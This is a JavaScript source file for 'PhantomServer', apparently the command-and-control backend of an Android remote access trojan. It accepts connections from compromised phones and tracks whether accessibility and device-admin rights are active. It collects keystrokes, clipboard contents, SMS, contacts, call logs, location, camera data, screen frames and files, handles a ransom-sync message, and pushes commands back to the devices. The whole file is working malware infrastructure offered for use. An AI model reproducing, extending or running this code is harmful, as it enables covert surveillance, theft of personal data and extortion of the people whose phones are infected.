const { EventEmitter } = require('events');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const http = require('http');

class DataStore {
    constructor() {
        this.devices = [];
        this.sms = [];
        this.contacts = [];
        this.calls = [];
        this.keylogs = [];
        this.clipboard = [];
    }
    saveDevice(d) {
        const existing = this.devices.find(x => x.id === d.id);
        if (existing) Object.assign(existing, d);
        else this.devices.push(d);
    }
    saveSMS(id, msgs) { if (Array.isArray(msgs)) this.sms.push(...msgs.map(m => ({ ...m, device_id: id }))); }
    saveContacts(id, c) { if (Array.isArray(c)) this.contacts.push(...c.map(x => ({ ...x, device_id: id }))); }
    saveCalls(id, c) { if (Array.isArray(c)) this.calls.push(...c.map(x => ({ ...x, device_id: id }))); }
    saveKeylog(id, data) { this.keylogs.push({ device_id: id, data, timestamp: Date.now() }); }
    saveClipboard(id, data) { this.clipboard.push({ device_id: id, data, timestamp: Date.now() }); }

    getSMS(id) { return this.sms.filter(x => x.device_id === id); }
    getContacts(id) { return this.contacts.filter(x => x.device_id === id); }
    getCalls(id) { return this.calls.filter(x => x.device_id === id); }
    getKeylogs(id) { return this.keylogs.filter(x => x.device_id === id); }
    getClipboard(id) { return this.clipboard.filter(x => x.device_id === id); }
    getUserData() { return []; }
    exportData() { return { sms: this.sms, contacts: this.contacts, calls: this.calls, keylogs: this.keylogs }; }
    clearAllData() { this.sms = []; this.contacts = []; this.calls = []; this.keylogs = []; this.clipboard = []; }
}

class PhantomServer extends EventEmitter {
    constructor(config = {}) {
        super();
        this.config = config;
        this.devices = new Map();
        this.sessions = new Map();
        this.server = null;
        this.port = 8080;
        this.running = false;
        this.dataStore = null;
    }

    setDataStore(ds) { this.dataStore = ds; }

    async start(port = 8080) {
        if (this.running) throw new Error('Listener already running');
        return new Promise((resolve, reject) => {
            try {
                this.port = port;
                this.server = http.createServer((req, res) => this.handleHttp(req, res));
                this.server.on('upgrade', (req, socket, head) => this.handleUpgrade(req, socket, head));
                this.server.listen(port, '0.0.0.0', () => {
                    this.running = true;
                    resolve(true);
                });
                this.server.on('error', (err) => {
                    if (err.code === 'EADDRINUSE') this.start(port + 1).then(resolve).catch(reject);
                    else reject(err);
                });
            } catch (err) { reject(err); }
        });
    }

    stop() {
        try {
            this.devices.forEach(d => { try { if (d.socket) d.socket.destroy(); } catch (e) { } });
            this.devices.clear();
            this.sessions.clear();
            if (this.server) this.server.close();
            this.running = false;
        } catch (err) { }
    }

    handleHttp(req, res) {
        const url = req.url || '/';
        const qi = url.indexOf('?');
        const pathname = qi >= 0 ? url.substring(0, qi) : url;
        const query = qi >= 0 ? url.substring(qi + 1) : '';
        const params = {};
        query.split('&').forEach(pair => {
            const parts = pair.split('=');
            const k = parts[0];
            const v = parts.length > 1 ? parts[1] : '';
            if (k) params[decodeURIComponent(k)] = decodeURIComponent(v);
        });

        if (pathname === '/socket.io/' && params.transport === 'polling' && !params.sid) {
            const sid = crypto.randomBytes(12).toString('hex');
            const deviceId = params.id || sid;
            this.sessions.set(sid, {
                sid, deviceId,
                model: params.model || 'Unknown',
                release: params.release || 'Unknown',
                ip: req.socket.remoteAddress,
                connectedAt: Date.now(),
                socket: null, upgraded: false, registered: false
            });
            const openPacket = '0' + JSON.stringify({
                sid, upgrades: ['websocket'],
                pingInterval: 25000, pingTimeout: 20000, maxPayload: 1000000
            });
            res.writeHead(200, {
                'Content-Type': 'text/plain; charset=UTF-8',
                'Content-Length': Buffer.byteLength(openPacket),
                'Access-Control-Allow-Origin': '*'
            });
            res.end(openPacket);
            return;
        }
        if (pathname === '/socket.io/' && params.transport === 'polling' && params.sid) {
            res.writeHead(200, { 'Content-Type': 'text/plain; charset=UTF-8' });
            res.end('6');
            return;
        }
        res.writeHead(404);
        res.end('Not Found');
    }

    handleUpgrade(req, socket, head) {
        const url = req.url || '/';
        const qi = url.indexOf('?');
        const query = qi >= 0 ? url.substring(qi + 1) : '';
        const params = {};
        query.split('&').forEach(pair => {
            const parts = pair.split('=');
            const k = parts[0];
            const v = parts.length > 1 ? parts[1] : '';
            if (k) params[decodeURIComponent(k)] = decodeURIComponent(v);
        });
        const session = this.sessions.get(params.sid);
        if (!session) { socket.write('HTTP/1.1 400 Bad Request\r\n\r\n'); socket.destroy(); return; }
        const key = req.headers['sec-websocket-key'];
        if (!key) { socket.write('HTTP/1.1 400 Bad Request\r\n\r\n'); socket.destroy(); return; }
        const accept = crypto.createHash('sha1')
            .update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11')
            .digest('base64');
        socket.write(
            'HTTP/1.1 101 Switching Protocols\r\n' +
            'Upgrade: websocket\r\nConnection: Upgrade\r\n' +
            'Sec-WebSocket-Accept: ' + accept + '\r\n\r\n'
        );
        session.socket = socket;
        this.attachWebSocket(session);
    }

    attachWebSocket(session) {
        const socket = session.socket;
        const self = this;
        function closeSession() {
            if (session.registered) {
                self.emit('deviceDisconnected', { id: session.deviceId, model: session.model, status: 'offline' });
            }
            self.sessions.delete(session.sid);
        }
        let buffer = Buffer.alloc(0);
        socket.on('data', (chunk) => {
            buffer = Buffer.concat([buffer, chunk]);
            while (buffer.length >= 2) {
                const b0 = buffer[0], b1 = buffer[1];
                const opcode = b0 & 0x0F;
                const masked = (b1 & 0x80) !== 0;
                let len = b1 & 0x7F;
                let offset = 2;
                if (len === 126) { if (buffer.length < 4) return; len = buffer.readUInt16BE(2); offset = 4; }
                else if (len === 127) { if (buffer.length < 10) return; len = buffer.readUInt32BE(2) * 0x100000000 + buffer.readUInt32BE(6); offset = 10; }
                if (masked) offset += 4;
                if (buffer.length < offset + len) return;
                let payload = buffer.slice(offset, offset + len);
                if (masked) { const mask = buffer.slice(offset - 4, offset); for (let i = 0; i < payload.length; i++) payload[i] ^= mask[i % 4]; }
                buffer = buffer.slice(offset + len);
                if (opcode === 0x8) { self.sendWsFrame(socket, 0x8, Buffer.alloc(0)); socket.destroy(); return; }
                if (opcode === 0x9) { self.sendWsFrame(socket, 0xA, payload); }
                if (opcode === 0x1) { self.handleEngineIOPayload(session, payload.toString('utf8')); }
            }
        });
        socket.on('close', closeSession);
        socket.on('error', closeSession);
    }

    handleEngineIOPayload(session, payload) {
        if (!payload) return;
        let i = 0;
        while (i < payload.length) {
            const t = payload[i];
            if (t === '2') {
                if (payload.substring(i, i + 6) === '2probe') { this.sendEngineIOPacket(session, '3probe'); i += 6; continue; }
                this.sendEngineIOPacket(session, '3'); i += 1; continue;
            }
            if (t === '5') { session.upgraded = true; i += 1; continue; }
            if (t === '3') { i += 1; continue; }
            if (t === '4') {
                const rest = payload.substring(i + 1);
                let endIdx = rest.length;
                for (let j = 0; j < rest.length; j++) {
                    const c = rest[j], n = rest[j + 1];
                    if ((c === '2' || c === '3' || c === '4' || c === '5' || c === '6') && (n === '{' || n === '[')) { endIdx = j; break; }
                }
                this.processMessage(session, rest.substring(0, endIdx));
                i += 1 + endIdx; continue;
            }
            i += 1;
        }
    }

    sendEngineIOPacket(session, packet) {
        try { if (session.socket && !session.socket.destroyed) this.sendWsFrame(session.socket, 0x1, Buffer.from(packet, 'utf8')); }
        catch (err) { }
    }

    sendWsFrame(socket, opcode, payload) {
        try {
            const len = payload.length;
            let header;
            if (len < 126) { header = Buffer.alloc(2); header[0] = 0x80 | opcode; header[1] = len; }
            else if (len < 65536) { header = Buffer.alloc(4); header[0] = 0x80 | opcode; header[1] = 126; header.writeUInt16BE(len, 2); }
            else { header = Buffer.alloc(10); header[0] = 0x80 | opcode; header[1] = 127; header.writeUInt32BE(Math.floor(len / 0x100000000), 2); header.writeUInt32BE(len >>> 0, 6); }
            socket.write(Buffer.concat([header, payload]));
        } catch (err) { }
    }

    processMessage(session, message) {
        try {
            const msg = JSON.parse(message);
            const type = msg.type;
            const deviceId = msg.deviceId || session.deviceId;

            if (type === 'REGISTER') {
                const device = {
                    id: deviceId, sid: session.sid,
                    model: msg.model || 'Unknown',
                    androidVersion: msg.androidVersion || 'Unknown',
                    sdk: msg.sdk || 0, ip: session.ip,
                    status: 'online', lastSeen: Date.now(),
                    accessibilityEnabled: msg.accessibilityEnabled || false,
                    adminActive: msg.adminActive || false,
                    carrier: msg.carrierName || '',
                    country: msg.simCountry || msg.networkCountry || msg.localeCountry || '',
                    battery: msg.battery || 0,
                    connectedAt: Date.now()
                };
                this.devices.set(deviceId, device);
                session.registered = true;
                this.emit('deviceConnected', device);
                this.sendToDevice(deviceId, { type: 'WELCOME' });
                return;
            }

            if (type === 'ACCESSIBILITY_STATE') {
                const d = this.devices.get(deviceId);
                if (d) {
                    const wasOn = d.accessibilityEnabled;
                    const wasAdmin = d.adminActive;
                    const nowOn = msg.enabled === true;
                    const nowAdmin = msg.admin === true;
                    d.accessibilityEnabled = nowOn;
                    d.adminActive = nowAdmin;
                    d.lastSeen = Date.now();
                    if (wasOn !== nowOn || wasAdmin !== nowAdmin) this.emit('deviceConnected', d);
                }
                return;
            }

            if (type === 'LOG') { this.emit('deviceLog', deviceId, msg.level, msg.message); return; }
            if (type === 'HEARTBEAT') { const d = this.devices.get(deviceId); if (d) d.lastSeen = Date.now(); return; }
            if (type === 'COMMAND_RESULT') { this.emit('commandResult', deviceId, msg.command, msg.result); return; }
            if (type === 'UI_TREE') { this.emit('uiTree', deviceId, msg.data); return; }
            if (type === 'SCREEN_FRAME') { this.emit('screenFrame', deviceId, msg.data); return; }
            if (type === 'KEYLOG') { this.emit('keylog', deviceId, msg.data); return; }
            if (type === 'CLIPBOARD') { this.emit('clipboard', deviceId, msg.data); return; }
            if (type === 'SMS_DATA') { this.emit('sms', deviceId, msg.data); return; }
            if (type === 'CONTACTS') { this.emit('contacts', deviceId, msg.data); return; }
            if (type === 'CALLS') { this.emit('calls', deviceId, msg.data); return; }
            if (type === 'APPS') { this.emit('apps', deviceId, msg.data); return; }
            if (type === 'LOCATION') { this.emit('location', deviceId, msg); return; }
            if (type === 'CAMERA_DATA') { this.emit('camera', deviceId, msg.data); return; }
            if (type === 'FILES') { this.emit('files', deviceId, msg); return; }
            if (type === 'FILE_DATA') { this.emit('fileData', deviceId, msg.name, msg.data); return; }
            if (type === 'RANSOM_SYNC') { this.emit('ransomSync', deviceId, msg); return; }
            if (type === 'USER_DATA') { this.emit('userData', deviceId, msg.data); return; }
        } catch (err) { }
    }

    sendCommand(deviceId, command, params) {
        try {
            const device = this.devices.get(deviceId);
            if (!device) return { success: false, error: 'Device not found' };
            const session = this.sessions.get(device.sid);
            if (!session || !session.socket) return { success: false, error: 'Session lost' };
            const packet = JSON.stringify({ command, params: params || {}, timestamp: Date.now() });
            this.sendEngineIOPacket(session, '4' + packet);
            return { success: true };
        } catch (err) { return { success: false, error: err.message }; }
    }

    sendToDevice(deviceId, obj) {
        try {
            const device = this.devices.get(deviceId);
            if (!device) return;
            const session = this.sessions.get(device.sid);
            if (!session) return;
            this.sendEngineIOPacket(session, '4' + JSON.stringify(obj));
        } catch (err) { }
    }

    getAllDevices() { return Array.from(this.devices.values()); }
    getDevice(id) { return this.devices.get(id); }
}

class DeviceManager extends EventEmitter {
    constructor(server) {
        super();
        this.server = server;
        this.devices = new Map();
        server.on('deviceConnected', (d) => { this.devices.set(d.id, d); this.emit('deviceAdded', d); });
        server.on('deviceDisconnected', (d) => { this.devices.delete(d.id); this.emit('deviceRemoved', d.id); });
        const passthrough = ['commandResult', 'keylog', 'clipboard', 'sms', 'contacts', 'calls', 'apps', 'deviceLog', 'uiTree', 'foreground', 'location', 'camera', 'files', 'fileData', 'ransomSync', 'userData'];
        passthrough.forEach(ev => server.on(ev, (...args) => this.emit(ev, ...args)));
    }
    getAllDevices() { return Array.from(this.devices.values()); }
    getDevice(id) { return this.devices.get(id); }
    sendCommand(deviceId, command, params) { return this.server.sendCommand(deviceId, command, params); }
    broadcastCommand(c, p) { return this.server.broadcastCommand(c, p); }
}

module.exports = { PhantomServer, DeviceManager, DataStore };